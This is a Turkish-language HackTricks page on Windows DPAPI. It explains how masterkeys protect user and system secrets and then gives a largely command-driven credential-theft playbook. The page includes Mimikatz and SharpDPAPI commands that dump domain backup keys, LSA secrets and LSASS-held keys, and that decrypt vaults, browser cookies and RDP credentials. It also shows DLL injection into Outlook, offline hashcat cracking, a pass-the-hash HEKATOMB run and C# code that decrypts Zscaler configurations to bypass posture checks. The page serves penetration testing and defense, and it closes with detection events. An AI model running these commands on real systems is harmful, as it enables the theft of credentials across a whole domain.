# DPAPI - Şifrelerin Çıkarılması

{{#include ../../banners/hacktricks-training.md}}



## DPAPI Nedir

Data Protection API (DPAPI), esasen Windows işletim sistemi içinde **asimetrik özel anahtarların simetrik şifrelemesi** için kullanılmaktadır ve kullanıcı veya sistem sırlarını önemli bir entropi kaynağı olarak kullanır. Bu yaklaşım, geliştiricilerin kullanıcıların oturum açma sırlarından veya sistem şifrelemesi için sistemin alan kimlik doğrulama sırlarından türetilen bir anahtar kullanarak verileri şifrelemelerine olanak tanıyarak şifrelemeyi basitleştirir; böylece geliştiricilerin şifreleme anahtarının korunmasını kendilerinin yönetmesine gerek kalmaz.

DPAPI'yi kullanmanın en yaygın yolu, uygulamaların mevcut oturum açmış süreçle verileri güvenli bir şekilde şifrelemesine ve şifresini çözmesine olanak tanıyan **`CryptProtectData` ve `CryptUnprotectData`** fonksiyonlarıdır. Bu, şifrelenmiş verilerin yalnızca onu şifreleyen aynı kullanıcı veya sistem tarafından şifresinin çözülebileceği anlamına gelir.

Ayrıca, bu fonksiyonlar şifreleme ve şifre çözme sırasında kullanılacak bir **`entropy` parametresi** de kabul eder; bu nedenle, bu parametre kullanılarak şifrelenmiş bir şeyi şifresini çözmek için, şifreleme sırasında kullanılan aynı entropi değerini sağlamanız gerekir.

### Kullanıcı Anahtar Üretimi

DPAPI, her kullanıcı için kimlik bilgilerine dayalı olarak benzersiz bir anahtar ( **`pre-key`** olarak adlandırılır) üretir. Bu anahtar, kullanıcının şifresinden ve diğer faktörlerden türetilir ve algoritma kullanıcı türüne bağlıdır ancak sonuçta bir SHA1 olur. Örneğin, alan kullanıcıları için, **kullanıcının HTLM hash'ine bağlıdır**.

Bu, bir saldırganın kullanıcının şifre hash'ini elde edebilmesi durumunda özellikle ilginçtir, çünkü:

- **DPAPI kullanılarak o kullanıcının anahtarıyla şifrelenmiş herhangi bir veriyi şifre çözebilir** ve herhangi bir API ile iletişim kurmasına gerek kalmaz
- Geçerli DPAPI anahtarını oluşturmayı deneyerek **şifreyi kırmaya** çalışabilir

Ayrıca, bir kullanıcı DPAPI kullanarak her veri şifrelediğinde, yeni bir **master key** üretilir. Bu master key, verileri şifrelemek için gerçekten kullanılan anahtardır. Her master key, onu tanımlayan bir **GUID** (Küresel Benzersiz Tanımlayıcı) ile verilir.

Master key'ler, **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** dizininde saklanır; burada `{SID}`, o kullanıcının Güvenlik Tanımlayıcısıdır. Master key, kullanıcının **`pre-key`** ile ve ayrıca kurtarma için bir **alan yedek anahtarı** ile şifrelenmiş olarak saklanır (yani aynı anahtar, 2 farklı şifre ile 2 kez şifrelenmiş olarak saklanır).

**Master key'i şifrelemek için kullanılan alan anahtarının alan denetleyicilerinde olduğunu ve asla değişmediğini** unutmayın; bu nedenle, bir saldırgan alan denetleyicisine erişim sağlarsa, alan yedek anahtarını alabilir ve alandaki tüm kullanıcıların master key'lerini şifre çözebilir.

Şifrelenmiş blob'lar, verileri şifrelemek için kullanılan **master key'in GUID'sini** başlıklarında içerir.

> [!TIP]
> DPAPI şifreli blob'lar **`01 00 00 00`** ile başlar

Master key'leri bul:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Bu, bir kullanıcının bir dizi Master Key'inin nasıl görüneceğidir:

![](<../../images/image (1121).png>)

### Makine/Sistem anahtarı oluşturma

Bu, makinenin verileri şifrelemek için kullandığı anahtardır. **DPAPI_SYSTEM LSA sırrı** üzerine kuruludur; bu, yalnızca SYSTEM kullanıcısının erişebileceği özel bir anahtardır. Bu anahtar, makine düzeyindeki kimlik bilgileri veya sistem genelindeki sırlar gibi sistemin kendisi tarafından erişilmesi gereken verileri şifrelemek için kullanılır.

Bu anahtarların **bir alan yedeği yoktur**, bu nedenle yalnızca yerel olarak erişilebilirler:

- **Mimikatz**, LSA sırlarını dökerek buna erişebilir: `mimikatz lsadump::secrets`
- Sır, kayıt defterinde saklanır, bu nedenle bir yönetici **erişim için DACL izinlerini değiştirebilir**. Kayıt defteri yolu: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### DPAPI ile Korunan Veriler

DPAPI tarafından korunan kişisel veriler arasında şunlar bulunmaktadır:

- Windows kimlik bilgileri
- Internet Explorer ve Google Chrome'un şifreleri ve otomatik tamamlama verileri
- Outlook ve Windows Mail gibi uygulamalar için e-posta ve dahili FTP hesap şifreleri
- Paylaşılan klasörler, kaynaklar, kablosuz ağlar ve Windows Vault için şifreler, şifreleme anahtarları dahil
- Uzak masaüstü bağlantıları, .NET Passport ve çeşitli şifreleme ve kimlik doğrulama amaçları için özel anahtarlar için şifreler
- Credential Manager tarafından yönetilen ağ şifreleri ve CryptProtectData kullanan uygulamalardaki kişisel veriler, örneğin Skype, MSN messenger ve daha fazlası
- Kayıt defterinde şifrelenmiş bloblar
- ...

Sistem korumalı veriler şunları içerir:
- Wifi şifreleri
- Zamanlanmış görev şifreleri
- ...

### Master anahtar çıkarma seçenekleri

- Kullanıcının alan yönetici ayrıcalıkları varsa, alan içindeki tüm kullanıcı master anahtarlarını şifrelerini çözmek için **alan yedek anahtarına** erişebilirler:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Yerel yönetici ayrıcalıklarıyla, **tüm bağlı kullanıcıların DPAPI anahtarlarını ve SYSTEM anahtarını çıkarmak için LSASS belleğine erişmek** mümkündür.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Eğer kullanıcı yerel yönetici ayrıcalıklarına sahipse, makine anahtarlarını şifrelemek için **DPAPI_SYSTEM LSA sırrına** erişebilir:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Kullanıcının şifresi veya NTLM hash'i biliniyorsa, **kullanıcının anahtarlarını doğrudan şifre çözebilirsiniz**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Eğer bir oturumda kullanıcı olarak iseniz, DC'den **anahtarları şifre çözmek için yedek anahtarı RPC kullanarak** istemek mümkündür. Eğer yerel yöneticiyseniz ve kullanıcı oturum açmışsa, bunun için **oturum belirtecini çalabilirsiniz**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## List Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI Şifreli Verilere Erişim

### DPAPI Şifreli Verileri Bulma

Ortak kullanıcıların **korunan dosyaları** şunlardadır:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Yukarıdaki yollarda `\Roaming\` kısmını `\Local\` olarak değiştirmeyi de kontrol edin.

Sıralama örnekleri:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) DPAPI şifreli blob'ları dosya sisteminde, kayıt defterinde ve B64 blob'larında bulabilir:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Not edin ki [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aynı repodan) DPAPI kullanarak çerezler gibi hassas verileri şifre çözmek için kullanılabilir.

### Erişim anahtarları ve veriler

- **SharpDPAPI** kullanarak mevcut oturumdan DPAPI şifreli dosyalardan kimlik bilgilerini alın:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Kimlik bilgileri bilgilerini alın** şifrelenmiş veriler ve guidMasterKey gibi.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Anahtarları erişin**:

RPC kullanarak **alan yedek anahtarını** talep eden bir kullanıcının anahtarını şifre çözün:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** aracının masterkey şifre çözümü için bu argümanları da desteklediğini unutmayın (domain yedek anahtarını almak için `/rpc`, düz metin şifresi kullanmak için `/password` veya bir DPAPI domain özel anahtar dosyası belirtmek için `/pvk` kullanmanın mümkün olduğunu göz önünde bulundurun...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Veri şifre çözme anahtarı kullanarak**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** aracı ayrıca `credentials|vaults|rdg|keepass|triage|blob|ps` şifre çözme işlemleri için bu argümanları destekler (domain yedek anahtarını almak için `/rpc`, düz metin şifresi kullanmak için `/password`, bir DPAPI domain özel anahtar dosyasını belirtmek için `/pvk`, mevcut kullanıcı oturumunu kullanmak için `/unprotect` kullanmanın mümkün olduğunu not edin...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- **Geçerli kullanıcı oturumu** kullanarak bazı verileri şifre çözme:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Opsiyonel Entropi Yönetimi ("Üçüncü taraf entropisi")

Bazı uygulamalar `CryptProtectData`'ya ek bir **entropi** değeri geçirir. Bu değer olmadan blob deşifre edilemez, doğru anahtar bilinse bile. Bu nedenle, bu şekilde korunan kimlik bilgilerine hedef alırken entropiyi elde etmek esastır (örneğin, Microsoft Outlook, bazı VPN istemcileri).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022), hedef süreç içindeki DPAPI işlevlerini yakalayan ve sağlanan herhangi bir opsiyonel entropiyi şeffaf bir şekilde kaydeden bir kullanıcı modu DLL'sidir. `outlook.exe` veya `vpnclient.exe` gibi süreçlere karşı **DLL-enjeksiyonu** modunda EntropyCapture çalıştırmak, her entropi tamponunu çağıran süreç ve blob ile eşleyen bir dosya çıktısı verecektir. Yakalanan entropi daha sonra veriyi deşifre etmek için **SharpDPAPI** (`/entropy:`) veya **Mimikatz** (`/entropy:<file>`) ile sağlanabilir.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft, Windows 10 v1607 (2016) ile birlikte **context 3** masterkey formatını tanıttı. `hashcat` v6.2.6 (Aralık 2023) hash-modları **22100** (DPAPI masterkey v1 context), **22101** (context 1) ve **22102** (context 3) ekleyerek kullanıcı şifrelerinin masterkey dosyasından doğrudan GPU hızlandırmalı bir şekilde kırılmasına olanak tanıdı. Bu nedenle, saldırganlar hedef sistemle etkileşime girmeden kelime listesi veya brute-force saldırıları gerçekleştirebilirler.

`DPAPISnoop` (2024) süreci otomatikleştirir:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Araç, Credential ve Vault blob'larını ayrıştırabilir, kırılmış anahtarlarla şifrelerini çözebilir ve düz metin şifrelerini dışa aktarabilir.

### Diğer makine verilerine erişim

**SharpDPAPI ve SharpChrome**'da, bir uzak makinenin verilerine erişmek için **`/server:HOST`** seçeneğini belirtebilirsiniz. Elbette, o makineye erişebilmeniz gerekir ve aşağıdaki örnekte **alan yedekleme şifreleme anahtarının bilindiği varsayılmaktadır**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Diğer araçlar

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB), LDAP dizininden tüm kullanıcılar ve bilgisayarların çıkarılmasını ve alan denetleyici yedek anahtarının RPC üzerinden çıkarılmasını otomatikleştiren bir araçtır. Script, ardından tüm bilgisayarların IP adreslerini çözecek ve tüm kullanıcıların DPAPI blob'larını almak için tüm bilgisayarlarda smbclient gerçekleştirecek ve her şeyi alan yedek anahtarı ile şifre çözecektir.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP'tan çıkarılan bilgisayar listesi ile, bilmediğiniz her alt ağı bulabilirsiniz!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI), DPAPI tarafından korunan gizli bilgileri otomatik olarak dökebilir. 2.x sürümü şunları tanıttı:

* Yüzlerce hosttan blob'ların paralel toplanması
* **context 3** anahtarlarının ayrıştırılması ve otomatik Hashcat kırma entegrasyonu
* Chrome "App-Bound" şifreli çerezler için destek (bir sonraki bölüme bakın)
* Yeni **`--snapshot`** modu, uç noktaları sürekli olarak sorgulayıp yeni oluşturulan blob'ları karşılaştırmak için

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop), Hashcat/JtR formatlarını çıkartabilen ve isteğe bağlı olarak otomatik kırma başlatabilen masterkey/credential/vault dosyaları için bir C# ayrıştırıcısıdır. Windows 11 24H1'e kadar makine ve kullanıcı masterkey formatlarını tamamen destekler.

## Yaygın tespitler

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` ve diğer DPAPI ile ilgili dizinlerdeki dosyalara erişim.
- Özellikle **C$** veya **ADMIN$** gibi bir ağ paylaşımından.
- LSASS belleğine erişmek veya masterkey'leri dökmek için **Mimikatz**, **SharpDPAPI** veya benzeri araçların kullanımı.
- Olay **4662**: *Bir nesne üzerinde bir işlem gerçekleştirildi* – **`BCKUPKEY`** nesnesine erişim ile ilişkilendirilebilir.
- Bir süreç *SeTrustedCredManAccessPrivilege* (Credential Manager) talep ettiğinde olay **4673/4674**.

---
### 2023-2025 güvenlik açıkları ve ekosistem değişiklikleri

* **CVE-2023-36004 – Windows DPAPI Güvenli Kanal Taklidi** (Kasım 2023). Ağ erişimi olan bir saldırgan, bir alan üyesini kötü niyetli bir DPAPI yedek anahtarını alması için kandırabilir, bu da kullanıcı masterkey'lerinin şifre çözülmesine olanak tanır. Kasım 2023 toplu güncellemesinde yamanmıştır – yöneticiler DC'lerin ve iş istasyonlarının tamamen yamanmış olduğundan emin olmalıdır.
* **Chrome 127 “App-Bound” çerez şifrelemesi** (Temmuz 2024), eski DPAPI yalnızca korumayı, kullanıcının **Credential Manager** altında saklanan ek bir anahtar ile değiştirmiştir. Çerezlerin çevrimdışı şifre çözümü artık hem DPAPI masterkey'ini hem de **GCM-sarılı uygulama bağlı anahtarı** gerektirir. SharpChrome v2.3 ve DonPAPI 2.x, kullanıcı bağlamında çalışırken ek anahtarı kurtarabilir.

### Vaka Çalışması: Zscaler Client Connector – SID'den Türetilen Özel Entropi

Zscaler Client Connector, `C:\ProgramData\Zscaler` altında birkaç yapılandırma dosyası saklar (örneğin, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Her dosya **DPAPI (Makine kapsamı)** ile şifrelenmiştir ancak satıcı, diskte saklanmak yerine *çalışma zamanında* hesaplanan **özel entropi** sağlar.

Entropi, iki unsurdan yeniden inşa edilir:

1. `ZSACredentialProvider.dll` içinde gömülü bir sabit gizli anahtar.
2. Yapılandırmanın ait olduğu Windows hesabının **SID**'si.

DLL tarafından uygulanan algoritma şuna eşdeğerdir:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Çünkü gizli bilgi, diskten okunabilen bir DLL'ye gömülüdür, **herhangi bir yerel saldırgan, SYSTEM haklarına sahip olduğunda, herhangi bir SID için entropiyi yeniden üretebilir** ve blob'ları çevrimdışı olarak şifrelerini çözebilir:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Şifre çözme, her **cihaz durumu kontrolü** ve beklenen değeri de içeren tam JSON yapılandırmasını verir - bu, istemci tarafı atlatmaları denemek için çok değerli bir bilgidir.

> İPUCU: Diğer şifreli nesneler (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI ile **entropy olmadan** korunmaktadır (`16` sıfır baytı). Bu nedenle, SYSTEM ayrıcalıkları elde edildikten sonra `ProtectedData.Unprotect` ile doğrudan şifresi çözülebilir.

## Referanslar

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
